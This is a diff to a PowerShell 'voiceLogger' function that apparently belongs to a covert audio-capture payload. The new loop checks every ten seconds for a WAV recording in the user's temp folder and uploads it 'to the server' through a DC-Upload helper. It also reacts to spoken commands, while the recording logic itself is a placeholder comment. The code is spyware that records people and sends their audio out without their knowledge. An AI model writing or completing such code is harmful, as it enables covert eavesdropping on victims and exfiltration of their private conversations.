@@ -37,29 +37,35 @@ function voiceLogger {
     $recognizer.SetInputToDefaultAudioDevice()
 
     $waveFilePath = "$env:tmp\VoiceLog.wav"
-    
-    # Set up a speech recognizer to record voice input
-    $recognizer.SetInputToWaveFile($waveFilePath)
-    
-    while ($true) {
-        $result = $recognizer.Recognize()
-        if ($result) {
-            Write-Output $result.Text
 
+    # Record audio (replace with actual recording logic)
+    # Example: Using Windows Voice Recorder or any other method to save WAV file to $waveFilePath
+
+    while ($true) {
+        # This is a placeholder for recording logic.
+        # You need to ensure the $waveFilePath is properly created and populated.
+        
+        if (Test-Path $waveFilePath) {
             # Send the WAV file to the server
             DC-Upload $waveFilePath
 
-            # Convert the WAV file to MP4 (external tool needed, e.g., ffmpeg)
-            # Example: & ffmpeg -i $waveFilePath "$env:tmp\VoiceLog.mp4"
-
-            # Optional: Remove the WAV file after conversion
+            # Optional: Remove the WAV file after upload
             # Remove-Item $waveFilePath
 
-            switch -regex ($result.Text) {
-                '\bnote\b' {saps notepad}
-                '\bexit\b' {break}
+            # Handle voice commands
+            $result = $recognizer.Recognize()
+            if ($result) {
+                Write-Output $result.Text
+                switch -regex ($result.Text) {
+                    '\bnote\b' {Start-Process notepad}
+                    '\bexit\b' {break}
+                }
             }
+        } else {
+            Write-Host "Error: The audio file was not found."
         }
+
+        Start-Sleep -Seconds 10  # Sleep to avoid high CPU usage, adjust as needed
     }
 }
 
